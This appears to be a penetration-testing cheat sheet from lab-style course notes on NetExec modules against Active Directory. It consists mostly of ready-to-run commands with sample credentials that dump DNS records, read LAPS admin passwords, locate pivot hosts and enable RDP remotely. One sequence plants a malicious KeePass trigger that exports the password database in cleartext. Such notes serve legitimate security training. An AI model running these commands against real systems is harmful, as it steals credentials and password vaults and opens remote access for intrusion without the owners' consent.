# 06.15 Popular Modules Network LAPS KeePass RDP Enable

> High-value NetExec modules: `get-network` (DNS), `laps`, `keepass_trigger`, `rdp` enable, `install_elevated`, `ioxidresolver`.

## Overview

A selection of high-value CME modules: `get-network` dumps AD-integrated DNS records (IP/FQDN); `laps` retrieves LAPS passwords for computers where the account has read rights; `get_netconnections` and `ioxidresolver` identify multi-homed hosts for pivoting; `keepass_trigger` exfiltrates KeePass databases in cleartext; `rdp` module enables/disables RDP; `install_elevated` checks AlwaysInstallElevated.

## Steps

- `get-network`: uses AD DNS zone transfer equivalent; `ALL=true` returns both IP and FQDN; `ONLY_HOSTS=true` returns FQDN only.
- `laps`: retrieves LAPS passwords; `COMPUTER=WIN-*` for wildcard filtering.
- `get_netconnections` (WMI): returns all IPs including IPv6; `ioxidresolver` (RPC): returns IPs without IPv6.
- `keepass_trigger`: five steps — `ADD` trigger, `RESTART` KeePass, `POLL` for export, read `/tmp/export.xml`, `CLEAN` config. All-in-one: `ACTION=ALL` with `KEEPASS_CONFIG_PATH`.
- `rdp -o ACTION=enable` enables RDP by modifying the registry; `ACTION=disable` reverses it.
- Use `nxc smb -L` to see the full list of 50+ SMB modules.

## Commands

### DNS records — IP and FQDN

```bash
nxc ldap dc01.<DOMAIN>.htb -u julio -p Password1 -M get-network -o ALL=true
```

### Retrieve LAPS passwords

```bash
nxc ldap dc01.<DOMAIN>.htb -u robert -p <PASS> -M laps
```

### Find multi-homed hosts (WMI)

```bash
nxc smb <TARGET> -u julio -p Password1 -M get_netconnections
```

### Find multi-homed hosts (RPC)

```bash
nxc smb <TARGET> -u julio -p Password1 -M ioxidresolver
```

### Discover KeePass files/processes

```bash
nxc smb <TARGET> -u julio -p Password1 -M keepass_discover
```

### KeePass — add malicious trigger

```bash
nxc smb <TARGET> -u julio -p Password1 -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
```

### KeePass — restart process

```bash
nxc smb <TARGET> -u julio -p Password1 -M keepass_trigger -o ACTION=RESTART
```

### KeePass — poll for export

```bash
nxc smb <TARGET> -u julio -p Password1 -M keepass_trigger -o ACTION=POLL
```

### KeePass — all-in-one (add/restart/poll/clean)

```bash
nxc smb <TARGET> -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
```

### Enable RDP

```bash
nxc smb <TARGET> -u julio -p Password1 -M rdp -o ACTION=enable
```
